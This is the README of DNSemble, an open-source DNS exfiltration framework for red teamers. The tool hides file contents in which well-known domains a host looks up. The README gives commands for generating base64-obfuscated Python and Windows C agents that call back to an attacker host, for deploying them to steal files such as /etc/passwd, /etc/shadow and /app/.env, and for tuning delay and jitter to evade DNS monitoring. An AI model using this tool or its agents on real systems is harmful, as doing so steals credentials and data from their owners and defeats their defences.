# What is DNSemble? ![](https://img.shields.io/badge/python-3-blue)

DNSemble is an open-source project based on Python used to exfiltrate data using DNS.

DNSemble runs a DNS server that handles DNS requests and decodes hidden data from the choice of queried domain rather than encoding data in subdomains or record contents. Each DNS query is a legitimate lookup to a well-known domain (e.g., `google.com`, `mail.google.com`, `drive.google.com`), and the server forwards it upstream and returns the real IP address.

DNSemble can generate a custom agent written in `Python` or `C` that will read a target file, resolve a sequence of domains to exfiltrate the data one character at a time, and deliver the content to your DNSemble server.

You can edit the code of DNSemble agent as you wish, and build it using your own custom techniques.

The main goal of using DNSemble is to help red teamers/pentesters to exfiltrate data over a DNS channel that blends in with ordinary resolver traffic.

# How does it work?

DNSemble maps 98 well-known domains to 98 characters (95 printable ASCII plus `\n`, `\t`, `\r`). To exfiltrate a character, the client queries whichever domain currently maps to that character. The server sees the domain, decodes the character, forwards the query to a real upstream resolver, and returns the real answer.

For example, if the character `'S'` maps to `maps.google.com` in the current session, the client will send:

`A? maps.google.com`

The server decodes the character `'S'` from the domain choice and forwards the query upstream, so the client receives the **real IP address** of `maps.google.com`.

The mapping between characters and domains is randomized per session using a 32-bit PRNG seed negotiated at session start. This means:

- Session 1: `'S'` -> `maps.google.com`
- Session 2: `'S'` -> `firebase.google.com`
- Session 3: `'S'` -> `colab.google.com`


# How observable is it?

No exfiltration channel is invisible, and DNSemble is no exception. Here is an honest picture of what a defender can and cannot see:

* What looks normal: every query targets a real, well-known domain, resolves recursively, and returns real answers. There are no high-entropy subdomains and no unusual record types.
* What is observable: a transfer generates **one DNS query per character**, so volume scales with file size. Queries arrive from one host in a steady stream, and the queried names belong to a fixed pool of 98 domains. The `SESSION_START` response carries the session seed as an A record - anyone who captures it and the subsequent queries can rebuild the mapping offline.
* Practical mitigations: tune `--delay`/`--jitter` to shape the traffic, keep files small, and use a custom `--domains` pool that fits the target environment.

DNSemble makes the queries look like ordinary lookups; it cannot make the `pattern` of hundreds of lookups disappear, but you can control the volume of requests by using a sleep and jitter options.

# DNSemble key features:

* Exfiltrate data using the choice of queried domain - no encoded subdomains, no unusual records.
* Every DNS query is forwarded upstream and returns the real answer.
* Dynamic per-session mapping, the char-to-domain permutation is randomized for every session.
* 98 Google subdomains as the default domain pool as a default seed and PoC of the concept, you have to use your own list that matches the targeted enterprise infra.
* Pure agent written in `Python` with base64 obfuscation and the ability to customise it.
* Pure agent written in `C` for Windows targets with MinGW cross-compilation and the ability to customise it.
* The ability to embed target file paths directly into the agent.
* Configurable delay and jitter between each DNS request.
* Transaction ID encoding for multi-client multiplexing (up to 255 concurrent clients).
* Session limits, idle-session expiry, and incomplete-transfer detection on the server side.


# Requirements

DNSemble uses only the Python 3 standard library(`socket`, `struct`, `random`, `argparse`, `unittest`).

No `pip install` needed.

If you want to generate Windows C agents, make sure to install `mingw-w64` via:

`apt install mingw-w64`

# Installation

To get the latest version of DNSemble, make sure to clone it from this repo using the following command:

`git clone https://github.com/mhaskar/DNSemble`

After that, you are ready to execute DNSemble to get the following:

```
askar•/opt/redteaming/DNSemble(main⚡)» python3 DNSemble.py


    ____  _   _____                 __    __
   / __ \/ | / / ___/___  ____ ___  / /_  / /__
  / / / /  |/ /\__ \/ _ \/ __ `__ \/ __ \/ / _ \
 / /_/ / /|  /___/ /  __/ / / / / /_/ / /  __/
/_____/_/ |_//____/\___/_/ /_/ /_/_.___/_/\___/

  DNS Exfiltration Framework  ·  v1.0
  The domain IS the data.  Dynamic mapping.

  Listen addr    0.0.0.0:5353
  Upstream DNS   8.8.8.8:53
  Loot dir       ./loot/
  Ctrl domain    googleapis.com
  Domain pool    98 domains  (mapping randomised per session)
  Sessions       max 64, expire after 300s
  Per-query logging off  (use --verbose to follow transfers live)

[READY] Waiting for exfiltration sessions …
```

# Usage

To start using DNSemble, you have two independent workflows which are `generation` and `server` mode.

* `python3 DNSemble.py --payload ... --host ...` - generate an agent only.
* `python3 DNSemble.py` - start the DNS listener only.
* `python3 DNSemble.py --payload ... --host ... --serve` - generate, then start the listener.

And you can check the options using `-h` switch like the following:

```
askar•/opt/redteaming/DNSemble(main⚡)» python3 DNSemble.py -h
usage: DNSemble.py [-h] [--payloads] [--payload TYPE] [--host IP] [-a {x64,x86}]
                   [--jitter JITTER] [--delay DELAY] [-o FILE] [--files LIST]
                   [--domains FILE] [--serve] [-p PORT] [-u UPSTREAM]
                   [-l LOOT_DIR] [--session-timeout SESSION_TIMEOUT]
                   [--max-sessions MAX_SESSIONS] [--verbose] [--show-content]

DNSemble - DNS exfiltration framework

options:
  -h, --help            show this help message and exit

payload generation:
  --payloads            List available payload types
  --payload TYPE        Generate a payload (name or number from --payloads)
  --host IP             Public IP/hostname the agent will connect to
  -a {x64,x86}, --arch {x64,x86}
                        Target architecture for Windows payloads (default x64)
  --jitter JITTER       Jitter in ms baked into the agent (default 50)
  --delay DELAY         Delay in ms between queries baked into the agent (default 100)
  -o FILE, --output FILE
                        Output filename (default: auto-generated)
  --files LIST          Text file with target paths to embed (one per line)
  --domains FILE        Custom domain list file (default: data/domains.txt)

server mode:
  --serve               Start the DNS listener after generating a payload
                        (without --payload, the listener always starts)
  -p PORT, --port PORT  UDP listen port, 1-65535 (default 5353)
  -u UPSTREAM, --upstream UPSTREAM
                        Upstream DNS resolver (default 8.8.8.8)
  -l LOOT_DIR, --loot-dir LOOT_DIR
                        Directory to save exfiltrated files (default ./loot)
  --session-timeout SESSION_TIMEOUT
                        Seconds before an idle session is dropped (default 300)
  --max-sessions MAX_SESSIONS
                        Maximum concurrent sessions, 1-255 (default 64)
  --verbose             Log every DNS query while a transfer runs
  --show-content        Echo exfiltrated content to the console on completion
```

* --host: The public IP address or hostname of the machine running DNSemble. This is baked into the generated agent. The Windows C agent requires a dotted IPv4 address here (it resolves the server with `inet_addr`).

* --payload: The DNSemble payload "agent" you want to generate based on the technique and programming language.

* --output: Output path to save the DNSemble agent.

* --delay: Delay between each DNS request in milliseconds (default 100ms).

* --jitter: Random ± jitter in milliseconds added to the delay (default 50ms).

* --files: A text file containing target file paths (one per line) to embed into the agent. The agent will automatically exfiltrate these files when executed.

* --domains: Custom domain list file to use instead of the default 98 Google subdomains. The list must have exactly 98 unique, lowercase, DNS-valid names and must not contain the control domain.

* --arch: Target architecture for Windows C payloads (`x64` or `x86`).

* --serve: Start the listener after generating a payload, instead of exiting.

* -p/--port: UDP port the DNS server listens on (default 5353, use 53 with root).

* -u/--upstream: Upstream DNS resolver for forwarding queries and returning real responses (default 8.8.8.8).

* -l/--loot-dir: Directory where exfiltrated files are saved (default ./loot). Existing loot files are never overwritten - a second transfer with the same name is saved with a numbered suffix.

* --session-timeout / --max-sessions: server-side resource limits (idle session expiry and concurrency cap).

* --verbose / --show-content: opt-in logging. By default the server logs session lifecycle events only; per-query and content logging is off.

## DNSemble Payloads

To check the available DNSemble payloads, you can use `python3 DNSemble.py --payloads` to get the following results:

```
askar•/opt/redteaming/DNSemble(main⚡)» python3 DNSemble.py --payloads

[+] 2 DNSemble payloads Available

  #  Payload                Description
  ─  ─────────────────────  ───────────────────────────────────────────────────────
  1  generic/python         Hardcoded domain list - 1 setup query (session negotiation only)
  2  windows/c              Hardcoded domain list - 1 setup query (session negotiation only)
```

## Example of using DNSemble

This example will generate a Python agent that connects to `10.0.0.1` on port `5353` with a delay of `200ms` and jitter of `100ms`:

`python3 DNSemble.py --payload generic/python --host 10.0.0.1 --delay 200 --jitter 100`

And the output will be:

```
    ____  _   _____                 __    __
   / __ \/ | / / ___/___  ____ ___  / /_  / /__
  / / / /  |/ /\__ \/ _ \/ __ `__ \/ __ \/ / _ \
 / /_/ / /|  /___/ /  __/ / / / / /_/ / /  __/
/_____/_/ |_//____/\___/_/ /_/ /_/_.___/_/\___/

  DNS Exfiltration Framework  ·  v1.0
  The domain IS the data.  Dynamic mapping.

════════════════════════════════════════════════════════════
  PAYLOAD GENERATED
════════════════════════════════════════════════════════════
  Type       generic/python (Python 3 Agent)
  Server     10.0.0.1:5353
  Delay      200ms
  Jitter     ±100ms
  Domains    98 (baked into agent)
  Output     dnssemble_agent_10_0_0_1_5353.py
  Encoding   base64 + exec()
  Size       ... bytes
════════════════════════════════════════════════════════════

  Deploy on target and run:
    python3 dnssemble_agent_10_0_0_1_5353.py /etc/passwd
    python3 dnssemble_agent_10_0_0_1_5353.py secret.txt
```

Then you can deploy the generated agent on the target machine and execute it with the path to the file you want to exfiltrate. The agent will:

1. Negotiate a fresh session with a random seed
2. Build a randomized char-to-domain mapping
3. Send the hostname as AAAA queries
4. Send the filename as MX queries
5. Send the file content as A queries - one character per DNS lookup
6. Each query is forwarded upstream by the server and returns the real answer

The server will decode the hidden data and save the exfiltrated file to the `loot/` directory. If packets were lost in transit, the transfer is reported as INCOMPLETE and saved with a `.incomplete` suffix so a broken capture never passes for a good one.

## Example of using DNSemble with Windows C agent

This example will generate a Windows x64 C agent using MinGW cross-compilation:

`python3 DNSemble.py --payload windows/c --host 10.0.0.1 -o stealth.exe`

For x86 targets:

`python3 DNSemble.py --payload windows/c --host 10.0.0.1 -a x86 -o stealth.exe`

Note that the Windows agent requires a dotted IPv4 address for `--host`.

## Example of embedding target files

You can embed a list of target file paths directly into the agent so it automatically exfiltrates them upon execution:

```
echo "/etc/shadow" > targets.txt
echo "/app/.env" >> targets.txt
python3 DNSemble.py --payload generic/python --host 10.0.0.1 --files targets.txt
```

# Connectivity requirements

The agents talk to your DNSemble server **directly** on its UDP port. You have two deployment options:

* Direct connection: the target must be able to reach `--host : --port`. This is the common case when you control a hop on the target's network or can open an egress path.
* DNS redirection: point the target's resolver at the DNSemble server (or NAT/redirect its port 53 traffic to it). In this mode the target's normal resolver traffic also flows through DNSemble, which forwards everything upstream.

In both modes the server needs outbound UDP/53 access to a real resolver so answers are legitimate; without upstream access, queries are answered with `SERVFAIL` and agents retry until they give up.

# Limitations and platform differences

These are protocol properties, not bugs - plan operations around them:

* Text only: the protocol carries 98 characters (printable ASCII plus `\n`, `\t`, `\r`). Binary files, UTF-8/Unicode text, and other whitespace are not supported; the bundled agents skip characters that have no mapping, which corrupts such files.
* Size: content is capped at 64,768 characters per file (253 chunks × 256). Hostname and filename channels carry at most 256 characters each; embedded filenames longer than 255 characters are rejected at generation time.
* Speed: one DNS query per character, plus configured delay - a 10 KB file is roughly 10,000 queries.
* Loss: the channel is fire-and-forget over UDP with no acknowledgment or retransmission. A lost packet corrupts everything after it in that 256-char chunk; the server detects and flags this (`.incomplete`) but cannot repair it. Re-run the agent.
* Collisions: retransmitted chunk codes are refused, and a client ID already in use is protected - a second `SESSION_START` for the same ID is refused until the first transfer finishes or expires.
* Platforms: the C agent is Windows-only (Winsock), reads files as raw bytes, and resolves the server address with `inet_addr` (dotted IPv4 only). The Python agent needs Python 3 on the target and accepts hostnames or IPs.
* Filenames: the loot filename is derived from the reported hostname and filename; hostile client input is sanitised to `[A-Za-z0-9-_.]` and can never escape the loot directory.


# How is DNSemble different?

Traditional DNS exfiltration tools encode data in **subdomains** - `c3VwZXJzZWNyZXQ.evil.com` - which is trivially detected by any DNS monitor looking for high-entropy labels or queries to suspicious domains.

DNSemble encodes data in the choice of domain, not the domain content:

| | Traditional DNS Exfil | DNSemble |
|---|---|---|
| Query | `encoded-data.evil.com` | `maps.google.com` |
| Response | Crafted/fake | Real forwarded answer |
| Domain | Attacker-controlled | Well-known, legitimate |
| Detection | Easy (high-entropy subdomain) | Pattern-based (volume, one name per char) |
| Encoding | In the domain name itself | In which domain was chosen |

# Resources

* [DNSemble GitHub Repository](https://github.com/mhaskar/DNSemble)

# License

This project is licensed under the GPL-3.0 License - see the LICENSE file for details
